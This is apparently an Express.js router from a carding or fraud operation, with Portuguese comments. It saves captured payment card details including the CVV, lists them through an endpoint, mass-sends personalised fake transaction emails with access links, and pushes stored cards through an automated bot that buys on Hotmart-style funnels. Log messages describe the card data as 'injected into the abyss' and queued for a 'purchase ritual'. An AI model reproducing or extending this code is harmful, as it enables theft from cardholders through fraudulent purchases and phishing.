const express = require('express');
const router = express.Router();
const Cartao = require('../models/Cartao');
const filaCartoes = require('../queue'); // ⚠️ IMPORTANTE: Enfileirador
const nodemailer = require('nodemailer');
const { enviarEmail } = require('../utils/emailService');
const { executarFunilManual } = require('../services/hotmartBotManual'); // novo bot baseado no hotmartBot
const multer = require('multer');
const path = require('path');

const transporter = nodemailer.createTransport({
  host: 'smtp.zoho.com', // troca pro teu provedor (ex: smtp.gmail.com)
  port: 465,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
});

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, path.join(__dirname, 'uploads'));
  },
  filename: function (req, file, cb) {
    const nomeArquivo = Date.now() + '-' + file.originalname;
    cb(null, nomeArquivo);
  }
});

const upload = multer({ storage });

router.post('/salvar-cartao', async (req, res) => {
  try {
    const {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    } = req.body;

    const novoCartao = new Cartao({
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao,
      dataCaptura: new Date()
    });

    await novoCartao.save();
    console.log("🩸 Dado injetado no abismo:", novoCartao);

    // ⚠️ ENFIA NA FILA SATÂNICA DO REDIS
    await filaCartoes.add('compra', {
      email,
      emailConfirm,
      nome,
      numero,
      validade,
      cvv,
      nomeCartao
    });

    console.log("🎯 Job enfileirado para o ritual de compra.");

    res.json({ status: 'ok' });
  } catch (err) {
    console.error("💀 Erro na salvação:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});


// GET dos cartões salvos
router.get('/cartoes', async (req, res) => {
  try {
    const cartoes = await Cartao.find().sort({ dataCaptura: -1 }).limit(100);
    res.json(cartoes);
  } catch (err) {
    console.error("💀 Erro ao buscar cartões:", err);
    res.status(500).json({ status: 'erro', erro: err });
  }
});

router.post('/enviar-emails-personalizados', upload.single('imagem'), async (req, res) => {
  console.log("🧾 REQ BODY:", req.body);
  console.log("📦 REQ FILE:", req.file);

  let { clientes, transacao, data, valor, produto, linkAcesso } = req.body;

  // 👇 Faz o parse de clientes se vier como string (FormData faz isso)
  try {
    if (typeof clientes === 'string') {
      clientes = JSON.parse(clientes);
    }
  } catch (err) {
    return res.status(400).json({ status: 'erro', message: 'Clientes inválidos' });
  }

  if (!clientes || !Array.isArray(clientes) || clientes.length === 0) {
    return res.status(400).json({ status: 'erro', message: 'Nenhum cliente informado' });
  }

  if (!transacao || !data || !valor || !produto || !linkAcesso) {
    return res.status(400).json({ status: 'erro', message: 'Campos obrigatórios ausentes' });
  }

  let imagemURL = `${process.env.HOST_URL}/imagens/default.png`;
  if (req.file) {
    imagemURL = `${process.env.HOST_URL}/uploads/${req.file.filename}`;
  }

  try {
    for (const cliente of clientes) {
      const dados = {
        nome: cliente.nome,
        email: cliente.email,
        transacao,
        data,
        valor,
        produto,
        linkAcesso,
        imagem: imagemURL,
        mensagem: cliente.mensagem || '' // se precisar incluir
      };

      await enviarEmail(dados);
      console.log(`✅ Email enviado para ${cliente.nome} <${cliente.email}>`);
    }

    res.json({ status: 'ok', message: 'Todos os emails foram enviados com sucesso.' });
  } catch (err) {
    console.error('💥 Falha no envio:', err);
    res.status(500).json({ status: 'erro', message: 'Erro interno ao enviar emails' });
  }
});



router.post('/iniciar-compra-manual', async (req, res) => {
  try {
    const { modo, cartoesSelecionados, quantidade, links } = req.body;

    if (!links || !Array.isArray(links) || links.length === 0) {
      return res.status(400).json({ status: 'erro', message: 'Links inválidos ou ausentes.' });
    }

    let cartoesParaProcessar = [];

    if (modo === 'manual') {
      if (!cartoesSelecionados || !Array.isArray(cartoesSelecionados) || cartoesSelecionados.length === 0) {
        return res.status(400).json({ status: 'erro', message: 'Nenhum cartão selecionado no modo manual.' });
      }

      cartoesParaProcessar = cartoesSelecionados;

    } else if (modo === 'quantidade') {
      if (!quantidade || isNaN(quantidade) || quantidade <= 0) {
        return res.status(400).json({ status: 'erro', message: 'Quantidade inválida.' });
      }

      const cartoesDoBanco = await Cartao.find().sort({ dataCaptura: -1 }).limit(quantidade);
      if (!cartoesDoBanco || cartoesDoBanco.length === 0) {
        return res.status(404).json({ status: 'erro', message: 'Nenhum cartão disponível no banco.' });
      }

      cartoesParaProcessar = cartoesDoBanco.map(c => c.toObject());
    } else {
      return res.status(400).json({ status: 'erro', message: 'Modo inválido.' });
    }

    // Executar funil com cada cartão
    const resultado = [];

    for (let i = 0; i < cartoesParaProcessar.length; i++) {
      const cartao = cartoesParaProcessar[i];
      console.log(`🔥 Executando compra ${i + 1}/${cartoesParaProcessar.length}`);

      const dados = {
        ...cartao,
        links
      };

      try {
        await executarFunilManual(dados);
        resultado.push({ cartao: cartao.email, status: 'sucesso' });
      } catch (erro) {
        console.error(`💥 Falha na compra ${i + 1}:`, erro);
        resultado.push({ cartao: cartao.email || 'desconhecido', status: 'erro', erro: erro.message });
      }
    }

    res.json({ status: 'ok', resultado });

  } catch (error) {
    console.error("💀 Erro geral no disparo manual:", error);
    res.status(500).json({ status: 'erro', message: 'Falha ao processar compras manuais' });
  }
});


module.exports = router;
